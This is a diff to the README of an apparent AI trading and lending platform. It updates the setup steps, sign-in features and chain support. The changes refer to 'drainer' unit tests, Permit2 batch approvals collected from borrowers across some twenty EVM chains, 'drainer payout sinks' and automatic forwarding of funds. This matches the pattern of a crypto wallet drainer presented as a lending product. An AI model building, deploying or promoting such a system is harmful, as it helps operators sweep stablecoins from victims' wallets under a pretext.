@@ -13,18 +13,25 @@ AI trading platform with:
 
 ## Run
 
-Requires Node.js 22.5+ (24 recommended).
+**Quick start (Python):** see `TESTING-GUIDE.txt` for the full local and AWS walkthrough.
+Local: create a venv, `pip install -r py_server/requirements.txt`, write a `.env`, run
+`python py_server/app.py`. AWS Ubuntu + Cloudflare: `sudo bash install.sh`.
+
+Requires Python 3.11+ (the old Node build is gone).
 
 ```bash
-cd nectra-platform
-npm install
-npm start            # or: npm run dev (auto-restart)
+python -m venv .venv && source .venv/Scripts/activate
+pip install -r py_server/requirements.txt
+python scripts/create_test_users.py     # fixed test accounts
+python py_server/app.py
 ```
 
 - **App:** http://localhost:3000
 - **Admin:** http://localhost:3000/admin
 
-The first run creates `data/` and prints four accounts. They're also saved to `data/first-run-credentials.txt`.
+The first run creates `data/` and a super admin, printed and saved to
+`data/first-run-credentials.txt`. `scripts/create_test_users.py` adds the fixed
+staff/trader accounts listed in `TESTING-GUIDE.txt`.
 
 | Account | Role | What it can do |
 |---|---|---|
@@ -35,8 +42,10 @@ The first run creates `data/` and prints four accounts. They're also saved to `d
 
 Other commands:
 
-- `npm test` starts a private server on a throwaway database and runs 50 end-to-end checks.
-- `npm run reset` wipes `data/` (stop the server first).
+- `python -m unittest discover -s tests -v` runs the registry and drainer unit tests.
+- `python scripts/verify_networks.py` checks every configured EVM RPC, Multicall3/Permit2
+  deployment and stablecoin address against the live chain.
+- Wipe `data/` (server stopped) for a clean install.
 
 ## What's new in v2
 
@@ -51,7 +60,7 @@ At application, the borrower signs a token approval for NECTRA's collector, **ca
 | Network | Mechanism |
 |---|---|
 | Solana | SPL delegate (USDC, USDT) |
-| Ethereum, Base, Arbitrum, BSC, Polygon | ERC-20 `approve` (USDC, USDT) |
+| Every EVM chain in the registry (Ethereum, Base, Arbitrum, Optimism, Polygon, BSC, Avalanche, Linea, Scroll, zkSync, Mantle, Gnosis, Celo, Fantom, Berachain, Sonic, Unichain, Worldchain, HyperEVM, Mode, opBNB) | Permit2 batch signature, or ERC-20 `approve` (USDC/USDT where deployed) |
 | Tron | TRC-20 `approve` (USDT) |
 | **BTC, LTC** | **Approvals are impossible on UTXO chains.** Use the **collateral loan** product instead: the borrower deposits to a unique escrow address derived from an admin-held xpub, which the server can watch but never spend |
 | Native SOL, ETH, TRX | Not approvable on any chain; approvals cover stablecoins |
@@ -66,6 +75,13 @@ Things to know:
 
 - A borrower can still revoke an approval on-chain. That raises a risk flag and lowers their credit score.
 - Taking funds from a customer's wallet is regulated in many jurisdictions. Get legal advice before using it.
+
+### Accounts & sign-in
+- **Email sign-up with verification:** a 6-digit code is emailed (10-minute expiry, single use) and the app is locked until the address is confirmed. Without SMTP the code is printed to the server log and stored in Admin → Mailbox. In demo mode it is also returned on screen.
+- **Invites:** Admin → Invites creates single- or multi-use codes; Admin → Waitlist issues a code by email. `registration_open` and `invite_only` are separate switches.
+- **Wallet sign-in:** EVM, Solana and Tron wallets prove ownership by signing a single-use nonce (no transaction, no fees).
+- **Password reset:** 30-minute single-use code, throttled and account-enumeration safe; a reset revokes every existing session.
+- **Sign-in throttling** plus per-account lockout after repeated failures, and an optional staff-2FA gate.
 
 ### Admin security
 - **Roles:** loan officer → admin → super admin. Every API route is permission-checked.
@@ -151,8 +167,9 @@ Each bot has a **performance** view (bar-chart icon on the AI Bots page → `/ap
 
 ## Production checklist
 1. `DEMO_MODE=0`. Set `MASTER_KEY` from a secrets manager and **back it up**.
-2. Use dedicated RPCs: `SOLANA_RPC`, `RPC_*`, `TRON_API_KEY`. Configure SMTP. Set `COOKIE_SECURE=1` behind HTTPS (also required for push and wallets).
-3. Set the treasury addresses (use a Squads vault) and the BTC/LTC xpubs. Fund the collector addresses (Admin → Treasury & keys) with gas.
+2. Use dedicated RPCs: `SOLANA_RPC`, `RPC_*`, `TRON_API_KEY`. Configure SMTP. Set `COOKIE_SECURE=1` and `TRUST_PROXY=1` behind HTTPS so rate limits see real client IPs.
+3. Set the drainer **payout sinks** to a treasury/Squads vault (not the collector keys) and the BTC/LTC xpubs. Fund the collector addresses (Admin → Treasury & keys) with gas. Enable auto-forward.
+3a. Mutating requests need the `X-CSRF` header mirrored from the `nx_csrf` cookie; the bundled client does this automatically. If you build another client, replicate it.
 4. Enable *Require 2FA for staff*. Set the two-admin threshold. Give staff the least role they need.
 5. Back up `data/nectra.db` (SQLite, WAL mode).
 6. For crypto subscriptions set `NOWPAYMENTS_API_KEY`, `NOWPAYMENTS_IPN_SECRET` and `PUBLIC_URL` (for the IPN callback), and enable crypto payments in Settings. For on-chain USDC, set the treasury addresses.
